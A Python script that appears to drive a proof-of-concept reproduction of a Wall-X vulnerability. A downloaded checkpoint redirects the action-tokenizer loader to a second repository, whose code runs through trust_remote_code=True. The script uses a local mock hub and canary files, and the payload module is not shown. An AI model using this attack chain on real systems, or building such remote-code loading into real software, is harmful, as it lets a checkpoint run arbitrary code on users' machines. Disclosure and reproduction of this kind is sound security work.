"""Victim-side driver: consume ONE Wall-X checkpoint package through the real
first-party code paths, with the local mock hub standing in for huggingface.co.

The victim does nothing but point Wall-X at a checkpoint directory it downloaded
from the Hub - no trust flag, no processor name, no repository id:

    load_train_config_with_ckpt_overlay(<ckpt>/config.yml, <ckpt>)
        -> the checkpoint-local fallback rewrites action_tokenizer_path to <ckpt>
    get_action_tokenizer_mixin("fast").load_tokenizer(action_tokenizer_config, ...)
        -> tokenizer_mixin.py:314  AutoProcessor.from_pretrained(<ckpt>,
                                                          trust_remote_code=True)
        -> preprocessor_config.json's processor field names a SECOND repository
        -> that repository's processing_wallx_action.py is fetched, imported and run

usage: python run_repro.py ckpt_positive | ckpt_negative
"""
import json
import os
import shutil
import sys
from pathlib import Path

for _stream in (sys.stdout, sys.stderr):
    try:
        _stream.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # pragma: no cover - older interpreters
        pass
os.environ["PYTHONIOENCODING"] = "utf-8"
os.environ["PYTHONUTF8"] = "1"

HERE = Path(__file__).resolve().parent
WORK = HERE / "work"
PINNED = HERE / "wall-x-c0f5d67"
PORT = 8765

name = sys.argv[1] if len(sys.argv) > 1 else "ckpt_positive"
CKPT = WORK / name
REQLOG = WORK / "hub_requests.log"
CANARY = WORK / "canary" / name

if not (CKPT / "config.yml").is_file():
    sys.exit("checkpoint package not found: %s (run: python make_poc.py)" % CKPT)

processor_cfg = json.loads((CKPT / "preprocessor_config.json").read_text(encoding="utf-8"))
processor_ref = processor_cfg["auto_map"]["AutoProcessor"]
second_repo = processor_ref.split("--", 1)[0]

# ------------------------------------------------------------------ environment
sys.path.insert(0, str(PINNED))
os.environ["HF_ENDPOINT"] = "http://127.0.0.1:%d" % PORT          # the mock hub
os.environ["HF_HOME"] = str(WORK / ("hf-home-" + name))           # fresh cache per run
os.environ["HF_HUB_DISABLE_TELEMETRY"] = "1"
os.environ["HF_HUB_DISABLE_SYMLINKS_WARNING"] = "1"
os.environ["HF_HUB_DISABLE_IMPLICIT_TOKEN"] = "1"
os.environ["WALLX_POC_CANARY_DIR"] = str(CANARY)                  # where canaries land
os.environ["WALLX_POC_REPO"] = second_repo

# fresh cache and empty canary directory: every run really fetches, and any
# canary found afterwards was written during this run
shutil.rmtree(os.environ["HF_HOME"], ignore_errors=True)
shutil.rmtree(CANARY, ignore_errors=True)
CANARY.mkdir(parents=True, exist_ok=True)
if REQLOG.exists():
    REQLOG.unlink()

import mock_hub  # noqa: E402

mock_hub.start_server(port=PORT, hub_root=str(WORK / "hub"), request_log=str(REQLOG))

print("[victim] checkpoint package : %s  (canary dir empty at start: %s)"
      % (CKPT.relative_to(HERE), sorted(p.name for p in CANARY.iterdir()) == []))
print("[victim] mock hub           : http://127.0.0.1:%d  (stands in for huggingface.co)" % PORT)
print()

import wall_x  # noqa: E402
from wall_x._vendor.harrix.utils.train_config import (  # noqa: E402
    load_train_config_with_ckpt_overlay,
)
from wall_x.model.qact.tokenizer_mixin import get_action_tokenizer_mixin  # noqa: E402

import yaml  # noqa: E402

print("[victim] wall_x imported from: %s" % Path(wall_x.__file__).resolve().parent.relative_to(HERE))
print()
print("[victim] step 1 - checkpoint-local fallback (train_config.py:234-239, real first-party code):")
raw = yaml.safe_load((CKPT / "config.yml").read_text(encoding="utf-8"))
print("[victim]   config.yml records action_tokenizer_path = %r" % raw["action_tokenizer_path"])
print("[victim]   that path exists here: %s; checkpoint ships tokenizer.json + tokenizer_config.json: %s"
      % (os.path.exists(raw["action_tokenizer_path"]),
         (CKPT / "tokenizer.json").exists() and (CKPT / "tokenizer_config.json").exists()))
config = load_train_config_with_ckpt_overlay(str(CKPT / "config.yml"), str(CKPT))
print("[victim]   load_train_config_with_ckpt_overlay() -> action_tokenizer_path = %r"
      % config["action_tokenizer_path"])
print()

print("[victim] step 2 - fast action-tokenizer loader (tokenizer_mixin.py:312-318, real first-party code):")
print("[victim]   AutoProcessor.from_pretrained(config['action_tokenizer_path'], trust_remote_code=True)")
print("[victim]   the checkpoint's processor field names: %s" % processor_ref)
print()

action_tokenizer_config = dict(config.get("action_tokenizer", {}))
action_tokenizer_config.setdefault("action_tokenizer_path", config.get("action_tokenizer_path"))
mixin = get_action_tokenizer_mixin(config["action_tokenizer_type"])

try:
    tokenizer = mixin.load_tokenizer(action_tokenizer_config, None, device="cpu")
    print("[victim] load_tokenizer returned: %s" % type(tokenizer).__name__)
    call_error = None
except Exception as exc:  # noqa: BLE001
    tokenizer = None
    call_error = "%s: %s" % (type(exc).__name__, str(exc).splitlines()[0])
    print("[victim] load_tokenizer raised %s" % call_error)

# ------------------------------------------------------------------- evidence
print("-" * 78)
lines = REQLOG.read_text(encoding="utf-8").splitlines() if REQLOG.exists() else []
print("[victim] requests the loader sent to the named repository (%d):" % len(lines))
for line in lines:
    print("[victim]   %s" % line)

modules = Path(os.environ["HF_HOME"]) / "modules" / "transformers_modules"
imported = sorted(p for p in modules.rglob("*.py") if p.name != "__init__.py") if modules.exists() else []
print("[victim] remote Python modules imported into the process: %d%s"
      % (len(imported), (" " + imported[0].relative_to(modules).as_posix()) if imported else ""))

canaries = sorted(CANARY.glob("*.txt"))
print("[victim] canary files written by the fetched repository: %d" % len(canaries))
for path in canaries:
    first = path.read_text(encoding="utf-8").splitlines()[0]
    print("[victim]   %s: %s" % (path.name, first))

fetched_attacker = any(second_repo in l for l in lines)
print("-" * 78)
if canaries:
    print("[victim] RESULT: CODE FROM THE SECOND REPOSITORY WAS EXECUTED")
    print("[victim]         the checkpoint named %r; its .py ran on this machine" % second_repo)
    print("[victim]         while the processor was being built, without the user choosing any remote-code option.")
elif fetched_attacker or call_error:
    print("[victim] RESULT: the checkpoint redirected the load to %r, which carries no" % second_repo)
    print("[victim]         Python - nothing was imported and nothing executed.")
    if call_error:
        print("[victim]         loader error: %s" % call_error)
else:
    print("[victim] RESULT: unexpected - no request for %r in the hub log" % second_repo)
